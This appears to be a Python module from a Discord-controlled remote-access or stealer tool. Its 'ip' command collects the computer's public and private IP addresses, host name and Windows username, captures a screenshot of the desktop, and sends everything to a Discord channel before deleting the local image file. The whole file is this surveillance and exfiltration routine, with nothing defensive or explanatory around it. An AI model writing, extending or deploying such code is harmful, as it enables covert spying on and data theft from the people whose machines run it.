import discord
import pyautogui
import os
import socket
import requests
import discord

async def ip(ctx):
    public_ip = requests.get('https://api.ipify.org').text.strip()
    private_ip = socket.gethostbyname(socket.gethostname())
    pc_name = socket.gethostname()
    pc_username = os.getenv('USERNAME')
    
    screenshot_path = 'screenshot.png'
    pyautogui.screenshot(screenshot_path)
    
    embed = discord.Embed(title='IP Information', color=0x00ff00)
    embed.add_field(name='Public IPv4', value=public_ip, inline=False)
    embed.add_field(name='Private IPv4', value=private_ip, inline=False)
    embed.add_field(name='PC Name', value=pc_name, inline=False)
    embed.add_field(name='PC Username', value=pc_username, inline=False)
    
    file = discord.File(screenshot_path, filename='desktop.png')
    embed.set_image(url=f'attachment://desktop.png')

    await ctx.send(embed=embed, file=file)
    os.remove(screenshot_path)
